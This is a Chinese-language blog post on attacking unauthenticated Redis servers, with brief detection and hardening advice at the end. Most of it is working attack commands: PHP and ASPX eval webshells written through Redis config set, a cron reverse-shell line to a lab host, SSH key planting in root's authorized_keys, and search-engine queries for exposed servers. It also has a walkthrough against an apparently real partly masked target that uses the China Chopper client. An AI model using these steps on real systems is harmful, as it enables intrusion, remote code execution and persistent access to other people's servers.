---
title: "Redis漏洞利用与防御 - 0DayBug - 博客园"
source: "https://www.cnblogs.com/0daybug/p/12389138.html"
author:
published:
created: 2025-04-08
description: "前言 ​ Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现Redis未经授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为，早期网上曾经分析过一篇文章“通过redis感染linux版本勒索病毒的服务器”（http://www.sohu."
tags:
  - "clippings"
---
[![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a32f2de6953cc1287965374ec24bc047.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a32f2de6953cc1287965374ec24bc047.jpg)

## 前言

Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现Redis未经授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为，早期网上曾经分析过一篇文章“通过redis感染linux版本勒索病毒的服务器”（ [http://www.sohu.com/a/143409075\_765820](http://www.sohu.com/a/143409075_765820) ），如果公司使用了Redis，那么应当给予重视，通过实际研究，当在一定条件下，攻击者可以获取webshell，甚至root权限。

## Redis简介及搭建实验环境

### 简介

Remote Dictionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Map), 列表(list), 集合(sets) 和有序集合(sorted sets)等类型。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。目前最新稳定版本为4.0.8。

### Redis默认端口

Redis默认配置端口为6379，sentinel.conf配置器端口为26379

### 官方站点

[https://redis.io/](https://redis.io/)

[http://download.redis.io/releases/redis-3.2.11.tar.gz](http://download.redis.io/releases/redis-3.2.11.tar.gz)

### 安装 redis

```
wget http://download.redis.io/releases/redis-4.0.8.tar.gz
tar –xvf redis-4.0.8.tar.gz
cd redis-4.0.8
make
```

最新版本前期漏洞已经修复，测试时建议安装3.2.11版本。

### 修改配置文件 redis.conf

```
cp redis.conf ./src/redis.conf
bind 127.0.0.1  前面加上#号注释掉
protected-mode 设为 no
​
启动 redis-server
./src/redis-server redis.conf
```

最新版安装成功后，如图1所示。默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。

[![image.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/284efe09bb845961135ed33000f07cfc.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/284efe09bb845961135ed33000f07cfc.jpg)

<center>图1 安装配置 redis</center>

### 连接Redis服务器

#### 交互式方式

`redis-cli -h {host} -p {port}` 方式连接，然后所有的操作都是在交互的方式实现，不需要再执行redis-cli了，例如命令:

```
redis-cli -h 127.0.0.1-p 6379
​
加-a参数表示带密码的访问
```

#### 命令方式

`redis-cli -h {host} -p {port} {command}` 直接得到命令的返回结果.

### 常见命令

| 命令 | 描述 |
| --- | --- |
| info | 查看信息 |
| flushall | 删除所有数据库内容 |
| flushdb | 刷新数据库 |
| KEYS \* | 查看所有键,使用 select num 可以查看键值数据 |
| set test “who am i” | 设置变量 |
| config set dir dirpath | 设置路径等配置 |
| save | 保存 |
| get 变量 | 查看变量名称 |

更多命令可以参考文章： [https://www.cnblogs.com/kongzhongqijing/p/6867960.html](https://www.cnblogs.com/kongzhongqijing/p/6867960.html)

### 相关漏洞

因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞可导致敏感信息泄露（Redis服务器存储一些有趣的session、cookie或商业数据可以通过get枚举键值），也可以恶意执行flushall来清空所有数据，攻击者还可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登录服务器，其相关漏洞信息如下：

#### Redis 远程代码执行漏洞(CVE-2016-8339)

Redis 3.2.x < 3.2.4版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，代码执行。

#### CVE-2015-8080

Redis 2.8.x在2.8.24以前和3.0.x 在3.0.6以前版本，lua\_struct.c中存在getnum函数整数溢出，允许上下文相关的攻击者许可运行Lua代码（内存损坏和应用程序崩溃）或可能绕过沙盒限制意图通过大量，触发基于栈的缓冲区溢出。

#### CVE-2015-4335

Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码

#### CVE-2013-7458

读取“.rediscli\_history”配置文件信息

## Redis攻击思路

### 内网端口扫描

```
nmap -v -n -Pn -p 6379 -sV --scriptredis-info 192.168.56.1/24
```

### 通过文件包含读取其配置文件

Redis配置文件中一般会设置明文密码，在进行渗透时也可以通过webshell查看其配置文件，Redis往往不只一台计算机，可以利用其来进行内网渗透，或者扩展权限渗透。

### 使用Redis暴力破解工具

[https://github.com/evilpacket/redis-sha-crack](https://github.com/evilpacket/redis-sha-crack) ，其命令为：

```
node ./redis-sha-crack.js -w wordlist.txt -s shalist.txt 127.0.0.1 host2.example.com:5555
```

需要安装node：

```
git clone https://github.com/nodejs/node.git 
chmod -R 755 node
cd node
./configure
make
```

### msf下利用模块

```
auxiliary/scanner/redis/file_upload    normal     Redis File Upload
auxiliary/scanner/redis/redis_login    normal     Redis Login Utility
auxiliary/scanner/redis/redis_server   normal     Redis Command Execute Scanner
```

## Redis漏洞利用

### 获取webshell

当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell，前提是知道物理路径，精简命令如下：

```
config set dir E:/www/font
config set dbfilename redis2.aspx
set a "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"c\"],\"unsafe\");%>"
save
```

### 反弹shell

（1）连接Redis服务器

```
redis-cli –h 192.168.106.135 –p 6379
```

（2）在192.168.106.133上执行

```
nc –vlp 7999
```

（3）执行以下命令

```
set x "\n\n* * * * * bash -i >& /dev/tcp/192.168.106.133/7999 0>&1\n\n"
config set dir /var/spool/cron/
ubantu文件为：/var/spool/cron/crontabs/
config set dir /var/spool/cron/crontabs/
config set dbfilename root
save
```

### 免密码登录ssh

```
ssh-keygen -t rsa
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZA3SEwRcvoYWXRkXoxu7BlmhVQz7Dd8H9ZFV0Y0wKOok1moUzW3+rrWHRaSUqLD5+auAmVlG5n1dAyP7ZepMkZHKWU94TubLBDKF7AIS3ZdHHOkYI8y0NRp6jvtOroZ9UO5va6Px4wHTNK+rmoXWxsz1dNDjO8eFy88Qqe9j3meYU/CQHGRSw0/XlzUxA95/ICmDBgQ7E9J/tN8BWWjs5+sS3wkPFXw1liRqpOyChEoYXREfPwxWTxWm68iwkE3/22LbqtpT1RKvVsuaLOrDz1E8qH+TBdjwiPcuzfyLnlWi6fQJci7FAdF2j4r8Mh9ONT5In3nSsAQoacbUS1lul root@kali2018\n\n\n"
save
```

执行效果如图2所示:

[![image.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bfcc33aca9d570a6ed548611c32cffdc.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bfcc33aca9d570a6ed548611c32cffdc.jpg)

<center>图2Redis漏洞SSH免密码登录</center>

### 使用漏洞搜索引擎搜索

（1）对“port: 6379”进行搜索

[https://www.zoomeye.org/searchResult?q=port:6379](https://www.zoomeye.org/searchResult?q=port:6379)

（2）除去显示“-NOAUTH Authentication required.”的结果，显示这个信息表示需要进行认证，也即需要密码才能访问。

（3） [https://fofa.so/](https://fofa.so/)

关键字检索：port=”6379″ && protocol==redis && country=CN

### Redis账号获取webshell实战

1.扫描某目标服务器端口信息

通过nmap对某目标服务器进行全端口扫描，发现该目标开放Redis的端口为3357，默认端口为6379端口，再次通过iis put scaner软件进行同网段服务器该端口扫描，如图3所示，获取两台开放该端口的服务器。

[![image.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ec704c8e9d87b094b8497d13caba6f5b.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ec704c8e9d87b094b8497d13caba6f5b.jpg)

<center>图3扫描同网段开放该端口的服务器</center>

2.使用telnet登录服务器

使用命令“telnet ip port”命令登录，例如 `telnet 1**.**.**.76 3357` ，登录后，输入auth和密码进行认证。

3.查看并保存当前的配置信息。

通过“config get命令”查看dir和dbfilename的信息，并复制下来留待后续恢复使用。

```
config get dir
config get dbfilename
```

4.配置并写入webshell

（1）设置路径

```
config set dir E:/www/font
```

（2）设置数据库名称

将dbfilename对名称设置为支持脚本类型的文件，例如网站支持php，则设置file.php即可，本例中为aspx，所以设置redis.aspx。

```
config set dbfilename redis.aspx
```

（3）设置webshell的内容

根据实际情况来设置webshell的内容，webshell仅仅为一个变量，可以是a等其他任意字符，下面为一些参考示例。

```
set webshell "<?php phpinfo(); ?>" 
 //php查看信息
set webshell "<?php @eval($_POST['chopper']);?> " 
 //phpwebshell
set webshell "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"c\"],\"unsafe\");%>"
// aspx的webshell，注意双引号使用\"
```

（4）保存写入的内容

`save`

（5）查看webshell的内容

`get webshell`

完整过程执行命令如图4所示，每一次命令显示“+OK”表示配置成功。

[![image.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/f7db1c3d346e5a56e1f407649e466126.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/f7db1c3d346e5a56e1f407649e466126.jpg)

<center>图4写入webshell</center>

1. 测试webshell是否正常

在浏览器中输入对应写入文件的名字，如图5所示进行访问，出现类似：

“REDIS0006?webshell’a@H搀???”则表明正确获取webshell。

[![image.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bb921a633095f583887e6e39858c5c26.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bb921a633095f583887e6e39858c5c26.jpg)

<center>图5测试webshell是否正常</center>

6.获取webshell

如图6所示，使用中国菜刀后门管理连接工具，成功获取该网站的webshell。

[![image.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/9af45f4507f54e1def42ca6c6c4cec84.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/9af45f4507f54e1def42ca6c6c4cec84.jpg)

<center>图6获取webshell</center>

7.恢复原始设置

（1）恢复dir

```
config set dir dirname
```

（2）恢复dbfilename

```
config set dbfilename dbfilename
```

（3）删除webshell

```
del webshell
```

（4）刷新数据库

```
flushdb
```

8.完整命令总结

```
telnet 1**.**.**.31 3357
auth 123456
config get dir
config get dbfilename
config set dir E:/www/
config set dbfilename redis2.aspx
set a "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"c\"],\"unsafe\");%>"
save
get a
```

9.查看redis配置conf文件

通过webshell，在其对应目录中发现还存在其它地址的redis，通过相同方法可以再次进行渗透，如图7所示，可以看到路径、端口、密码等信息。

[![image.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/386ec3cb1d31452496735751bae2e01f.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/386ec3cb1d31452496735751bae2e01f.jpg)

<center>图7查看redis其配置文件</center>

## Redis入侵检测和安全防范

### 入侵检测

#### 检测key

通过本地登录，通过“keys \*”命令查看，如果有入侵则其中会有很多的值，如图8所示，在keys \*执行成功后，可以看到有trojan1和trojan2命令，执行get trojan1即可进行查看。

[![image.png](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/03f1b3a30c2dff7af4b38ab45e7348fc.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/03f1b3a30c2dff7af4b38ab45e7348fc.jpg)

<center>图8检查keys</center>

#### linux下需要检查authorized\_keys

Redis内建了名为crackit的key，也可以是其它值，同时Redis的conf文件中dir参数指向了/root/.ssh, `/root/.ssh/authorized_keys` 被覆盖或者包含Redis相关的内容,查看其值就可以直到是否被入侵过.

#### 对网站进行webshell扫描和分析

发现利用Redis账号漏洞的，则在shell中会村在Redis字样。

#### 对服务器进行后门清查和处理

### 修复办法

（1）禁止公网开放Redis端口,可以在防火墙上禁用6379 Redis的端口

（2）检查authorized\_keys是否非法，如果已经被修改，则可以重新生成并恢复，不能使用修改过的文件。并重启ssh服务（service ssh restart）

（3）增加 Redis 密码验证

首先停止REDIS服务，打开redis.conf配置文件（不同的配置文件，其路径可能不同）/etc/redis/6379.conf,找到# requirepass foobared去掉前面的#号，然后将foobared改为自己设定的密码，重启启动redis服务。

（4）修改conf文件禁止全网访问，打开6379.conf文件，找到bind0.0.0.0前面加上# （禁止全网访问）。

### 可参考加固修改命令

| 命令 | 描述 |
| --- | --- |
| port | 修改redis使用的默认端口 |
| bind | 设定redis监听的专用IP |
| requirepass | 设定redis连接的密码 |
| rename-command CONFIG “” | 禁用CONFIG命令 |
| rename-command info info2 | 重命名info为info2 |

## 参考文章

[http://cve.scap.org.cn/CVE-2015-8080.html](http://cve.scap.org.cn/CVE-2015-8080.html)

[http://cve.scap.org.cn/CVE-2015-4335.html](http://cve.scap.org.cn/CVE-2015-4335.html)

posted @ [0DayBug](https://www.cnblogs.com/0daybug)   阅读( 8611 )  评论( 0 ) [编辑](https://i.cnblogs.com/EditPosts.aspx?postid=12389138) [收藏](https://www.cnblogs.com/0daybug/p/) [举报](https://www.cnblogs.com/0daybug/p/)

[升级成为园子VIP会员](https://cnblogs.vip/)

\[Ctrl+Enter快捷键提交\]

[【推荐】100%开源！大型工业跨平台软件C++源码提供，建模，组态！](http://www.uccpsoft.com/index.htm)  
[【推荐】还在用 ECharts 开发大屏？试试这款永久免费的开源 BI 工具！](https://dataease.cn/?utm_source=cnblogs)  
[【推荐】国内首个AI IDE，深度理解中文开发场景，立即下载体验Trae](https://www.trae.com.cn/?utm_source=advertising&utm_medium=cnblogs_ug_cpa&utm_term=hw_trae_cnblogs)  
[【推荐】编程新体验，更懂你的AI，立即体验豆包MarsCode编程助手](https://www.marscode.cn/?utm_source=advertising&utm_medium=cnblogs.com_ug_cpa&utm_term=hw_marscode_cnblogs&utm_content=home)  
[【推荐】轻量又高性能的 SSH 工具 IShell：AI 加持，快人一步](http://ishell.cc/)  
[![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e8f772268b4b1817a9de8a8511022f9d.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e8f772268b4b1817a9de8a8511022f9d.jpg)

**编辑推荐：**  
· [为什么构造函数需要尽可能的简单](https://www.cnblogs.com/CareySon/p/18801509)  
· [探秘 MySQL 索引底层原理，解锁数据库优化的关键密码(下)](https://www.cnblogs.com/ibigboy/p/18803885)  
· [大模型 Token 究竟是啥：图解大模型Token](https://www.cnblogs.com/BNTang/p/18803486)  
· [35岁程序员的中年求职记：四次碰壁后的深度反思](https://www.cnblogs.com/minily/p/18803259)  
· [继承的思维：从思维模式到架构设计的深度解析](https://www.cnblogs.com/code-daily/p/18801661)  

**阅读排行：**  
· [基于Docker+DeepSeek+Dify ：搭建企业级本地私有化知识库超详细教程](https://www.cnblogs.com/LaiYun/p/18808736)  
· [由 MCP 官方推出的 C# SDK，使.NET 应用程序、服务和库能够快速实现与 MCP 客户端](https://www.cnblogs.com/Can-daydayup/p/18811795)  
· [电商平台中订单未支付过期如何实现自动关单？](https://www.cnblogs.com/seven97-top/p/18810985)  
· [上周热点回顾（3.31-4.6）](https://www.cnblogs.com/cmt/p/18812317)  
· [X86-64位简易系统开发 - 从BIOS阶段开始](https://www.cnblogs.com/akvicor/p/18811439)  

<table><tbody><tr><td colspan="7"><table><tbody><tr><td><a href="https://www.cnblogs.com/0daybug/p/">&lt;</a></td><td align="center">2025年4月</td><td align="right"><a href="https://www.cnblogs.com/0daybug/p/">&gt;</a></td></tr></tbody></table></td></tr><tr><th align="center">日</th><th align="center">一</th><th align="center">二</th><th align="center">三</th><th align="center">四</th><th align="center">五</th><th align="center">六</th></tr><tr><td align="center">30</td><td align="center">31</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td></tr><tr><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">10</td><td align="center">11</td><td align="center">12</td></tr><tr><td align="center">13</td><td align="center">14</td><td align="center">15</td><td align="center">16</td><td align="center">17</td><td align="center">18</td><td align="center">19</td></tr><tr><td align="center">20</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">24</td><td align="center">25</td><td align="center">26</td></tr><tr><td align="center">27</td><td align="center">28</td><td align="center">29</td><td align="center">30</td><td align="center">1</td><td align="center">2</td><td align="center">3</td></tr><tr><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">10</td></tr></tbody></table>

点击右上角即可分享 ![微信分享提示](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/555e49d6a3ba2183a3b8a2b6083355df.gif)